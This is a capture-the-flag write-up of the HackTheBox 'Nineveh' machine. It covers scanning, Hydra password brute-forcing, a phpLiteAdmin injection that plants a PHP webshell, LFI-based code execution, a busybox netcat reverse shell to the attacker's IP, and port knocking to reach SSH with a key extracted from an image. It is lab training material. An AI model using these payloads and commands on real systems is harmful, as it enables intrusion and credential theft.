---
icon: ubuntu
---

# Nineveh - Medium

<figure><img src="../../.gitbook/assets/image (3181).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/nineveh"><strong>Nineveh</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.5.85 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-26 18:50 -0500
Nmap scan report for 10.129.5.85
Host is up (0.034s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Synology DiskStation Manager 7.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 4.8 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   45.49 ms 10.10.16.1
2   45.59 ms 10.129.5.85
```
{% endcode %}

### <mark style="color:blue;">HTTPS Port 443 TCP</mark>

#### <mark style="color:$primary;">Site</mark>

<figure><img src="../../.gitbook/assets/image (3182).png" alt=""><figcaption></figcaption></figure>

Opening the site in firefox we managed to get a domain name and a user. I'll update my hosts file

```shellscript
10.129.5.85             nineveh.htb
```

First thing I tried was virtual host enumeration, but got nothing back

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -k -er -u https://nineveh.htb
```

<figure><img src="../../.gitbook/assets/image (3186).png" alt=""><figcaption></figcaption></figure>

We discovered some new endpoints

#### <mark style="color:$primary;">https://nineveh.htb/db/index.php</mark>

<figure><img src="../../.gitbook/assets/image (3187).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3188).png" alt=""><figcaption></figcaption></figure>

Quite a number of exploits we can use, but first I must find the password, considering we only need a password. I'll try brute forcing&#x20;

#### <mark style="color:$primary;">Hydra</mark>

Capture the login request in burpsuite&#x20;

<figure><img src="../../.gitbook/assets/image (3189).png" alt=""><figcaption></figcaption></figure>

* `Incorrect password` - text on the response that indicates failure to login

Note!! -> `hydra` requires a username, even if it won’t use it

Now, we can assemble the Hydra command

{% code overflow="wrap" %}
```shellscript
hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3190).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">phpLiteAdmin Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3191).png" alt=""><figcaption></figcaption></figure>

There is only one database test with no tables in it

### <mark style="color:blue;">PHP injection</mark>

The exploit `24044.txt` from `searchsploit` describes how to exploit phpLiteAdmin to get RCE

#### <mark style="color:$primary;">Step 1</mark>

Create a new db ending with .php

<figure><img src="../../.gitbook/assets/image (3165).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Step 2</mark>

I’ll click on the new db to switch to it, and create a table with 1 text field with a default value of a basic PHP webshell

<figure><img src="../../.gitbook/assets/image (3166).png" alt=""><figcaption></figcaption></figure>

```php
<?php system($_REQUEST["cmd"]); ?>
```

<figure><img src="../../.gitbook/assets/image (3176).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3177).png" alt=""><figcaption></figcaption></figure>

&#x20;I can see the path to the new `.php` webshell in `/var/tmp`

<figure><img src="../../.gitbook/assets/image (3169).png" alt=""><figcaption></figcaption></figure>

But I lack the LFI necessary to access that page in a browser. So this failed

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -u http://nineveh.htb/ -x php -o ferox-php
```

<figure><img src="../../.gitbook/assets/image (3183).png" alt=""><figcaption></figcaption></figure>

found a couple of interesting enpoints, I'll note info.php for later

#### <mark style="color:$primary;">/department/login.php</mark>

<figure><img src="../../.gitbook/assets/image (3185).png" alt=""><figcaption></figcaption></figure>

I discover that the site gives a way usernames, the error tells us when we get the usernames correct by saying invalid password! So we know <mark style="color:$success;">admin</mark> is a user

I am going to brute force the login

#### <mark style="color:$primary;">Hydra</mark>

Capture the login request in burpsuite

<figure><img src="../../.gitbook/assets/image (3171).png" alt=""><figcaption></figcaption></figure>

* `Invalid Password!` - text on the response that indicates failure to login

Now, we can assemble the Hydra command

{% code overflow="wrap" %}
```shellscript
hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3154).png" alt=""><figcaption></figcaption></figure>

```shellscript
admin:1q2w3e4r5t
```

<figure><img src="../../.gitbook/assets/image (3155).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3173).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Checking for LFI</mark>

| Notes parameter                                                                                   | Error Response                                                                 |
| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| <mark style="color:$info;">**notes=../../../../../etc/passwd**</mark>                             | <img src="../../.gitbook/assets/image (3174).png" alt="" data-size="original"> |
| <mark style="color:$info;">**notes=files/ninevehNotes.txt../../../../../../../etc/passwd**</mark> | <img src="../../.gitbook/assets/image (3175).png" alt="" data-size="original"> |

The phrase `ninevehNotes.txt` has to be in the parameter, or it just displays “**No Note is selected**”. Playing around with the parameter I managed to get it working!

### <mark style="color:blue;">RCE</mark>

I tried accessing the web shell I created earlier, but I ran into some errors

|                                                                                                                  |                                                                                |
| ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| <mark style="color:$info;">**notes=files/ninevehNotes.txt../../../../../../../var/tmp/deimos.php?cmd=id**</mark> | <img src="../../.gitbook/assets/image (3179).png" alt="" data-size="original"> |

But I managed to get it executing php by tweaking the path

```shellscript
notes=/ninevehNotes/../../var/tmp/deimos.php&cmd=id
```

<figure><img src="../../.gitbook/assets/image (3172).png" alt=""><figcaption></figcaption></figure>

I found netcat on the machine using `which nc`I'll use it to get a reverse shell

```shellscript
busybox nc 10.10.16.15 443 -e /bin/bash
```

{% code title="URL encoded variable payload" overflow="wrap" %}
```shellscript
notes=/ninevehNotes/../../var/tmp/deimos.php&cmd=busybox%20nc%2010.10.16.15%20443%20-e%20/bin/bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3158).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as www-data</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3160).png" alt=""><figcaption></figcaption></figure>

Besides root there is another user on this box there might be some credentials that we can find.

#### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (3159).png" alt=""><figcaption></figcaption></figure>

We found an interesting image possible containing an SSH key

```shellscript
strings nineveh.png
```

Running strings on it reveals a private SSH key for amrois

<figure><img src="../../.gitbook/assets/image (3161).png" alt=""><figcaption></figcaption></figure>

Our nmap scan however didn’t reveal an open SSH port!

<figure><img src="../../.gitbook/assets/image (3162).png" alt=""><figcaption></figcaption></figure>

running netstat reveals SSH on port 20 is active and listening!

I'll investigate for any suspicious process running in the background

```shellscript
ps aux
```

<figure><img src="../../.gitbook/assets/image (3163).png" alt=""><figcaption></figcaption></figure>

there is a `knockd` process running&#x20;

`knockd` is a daemon for port knocking, which will set certain firewall rules when certain ports are hit in order. I can find the config file at `/etc/knockd.conf`

{% code title="/etc/knockd.conf" %}
```shellscript
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```
{% endcode %}

This says I can open SSH by hitting 571, 290, and then 911 with syns, all within 5 seconds, and on doing so, it will add a rule to allow my IP to get to port 22.

### <mark style="color:$primary;">Port knocking</mark>

<mark style="color:yellow;">**Using knockd**</mark>

```shellscript
knock -v 10.129.6.13 571 290 911 -d 500
```

<figure><img src="../../.gitbook/assets/image (3164).png" alt=""><figcaption></figcaption></figure>

Afterward, use the private RSA key stored in the `amrois_rsa` file to establish an SSH connection.

<figure><img src="../../.gitbook/assets/image (3192).png" alt=""><figcaption></figcaption></figure>
